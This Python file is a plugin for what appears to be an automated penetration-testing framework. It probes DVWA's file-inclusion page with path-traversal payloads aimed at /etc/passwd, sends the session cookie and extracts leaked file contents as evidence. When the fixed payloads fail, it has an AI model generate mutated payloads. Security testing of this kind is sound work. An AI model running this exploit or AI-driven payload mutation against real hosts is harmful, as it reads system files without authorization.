import urllib.request
import urllib.parse
import re
import time
import json
from typing import Dict, Any
from plugins.base_plugin import BasePlugin
from interaction_logger import InteractionLogger
from confidence_engine import ConfidenceEngine
from ai_self_validation import groq_generate_payloads, groq_evaluate_results

class DVWALFIPlugin(BasePlugin):
    def __init__(self):
        self.logger = InteractionLogger()
        self.engine = ConfidenceEngine()

    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-LFI",
            "name": "DVWA Local File Inclusion (Autonomous Stage)",
            "cvss_score": 7.5,
            "service": "http",
            "vuln_type": "lfi"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        return service_info.get("service", "") in ["http", "https"]

    def _send_payload(self, base_url, target_ip, target_port, payload, cookie):
        """Gửi payload GET và trích xuất nội dung file từ cấu trúc HTML"""
        try:
            encoded_payload = urllib.parse.quote(payload)
            full_url = f"{base_url}?page={encoded_payload}"
            req = urllib.request.Request(full_url)
            req.add_header("Cookie", cookie)
            
            t0 = time.time()
            resp = urllib.request.urlopen(req, timeout=5)
            elapsed = round(time.time() - t0, 3)
            body = resp.read().decode('utf-8', errors='ignore')
            
            output = ""
            if "root:x:0:0:" in body:
                match = re.search(r'(root:x:0:0:.*?)\n<!DOCTYPE', body, re.DOTALL)
                output = match.group(1) if match else "Found /etc/passwd content"
            elif "Warning: include(" in body:
                output = "[PHP_WARNING]: Lỗi include file"
            else:
                clean_text = re.sub(r'<[^>]+>', '', body).strip()
                output = clean_text[:200]
                
            marker_hit = "root:x:" in body or "127.0.0.1 localhost" in body
            
            self.logger.log_transaction(
                plugin_id=self.METADATA["id"], target_ip=target_ip, target_port=target_port,
                url=full_url, method="GET", payload=payload, req_headers={"Cookie": cookie},
                res_status=resp.status, res_headers={}, res_body=output, latency=elapsed, marker_hit=marker_hit
            )
            return {"output": output, "hit": marker_hit, "latency": elapsed}
        except Exception as e:
            return {"output": str(e), "hit": False, "latency": -1}

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        cookie = context.get("session_cookie", "")
        if not cookie:
            return {"status": "PENDING", "evidence": "Chưa có session cookie trong shared_context."}

        url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/"
        kb_payloads = ["/etc/passwd", "../../etc/passwd"]
        initial_confirmed = None

        print(f"      [LFI-Autonomous] Vòng 1: Kiểm thử bằng Knowledge Base...")
        for payload in kb_payloads:
            res = self._send_payload(url, target_ip, target_port, payload, cookie)
            if res["hit"]:
                initial_confirmed = {"payload": payload, "output": res["output"]}
                break

        if not initial_confirmed:
            print(f"      [!] LFI KB MISS. Kích hoạt AI Mutation Engine...")
            telemetry_data = self.logger.get_plugin_telemetry(self.METADATA["id"])
            ai_plan = groq_generate_payloads(self.METADATA["id"], "lfi_mutation", url, {"telemetry": telemetry_data})
            for item in ai_plan.get("confirm_payloads", []):
                p_mutated = item.get("payload")
                res = self._send_payload(url, target_ip, target_port, p_mutated, cookie)
                if res["hit"]:
                    initial_confirmed = {"payload": p_mutated, "output": res["output"]}
                    break

        if not initial_confirmed:
            return {"status": "FALSE_POSITIVE", "evidence": "Mục tiêu an toàn với các LFI payload thử nghiệm."}

        telemetry_summary = self.logger.get_plugin_telemetry(self.METADATA["id"])
        decision = self.engine.calculate_score(
            rule_passed=True, ai_verdict="CONFIRMED", ai_confidence=90, telemetry_summary=telemetry_summary
        )

        return {
            "status": decision["verdict"],
            "confidence_metrics": decision["confidence_metrics"],
            "telemetry_summary": decision["telemetry_summary"],
            "evidence": (
                f"Local File Inclusion — Khai thác thành công.\n"
                f"      - Payload tối ưu nhất: {initial_confirmed['payload']}\n"
                f"      - Điểm toán học      : {json.dumps(decision['confidence_metrics'])}\n"
                f"      - Nội dung tệp rò rỉ : {initial_confirmed['output'][:120]}"
            )
        }
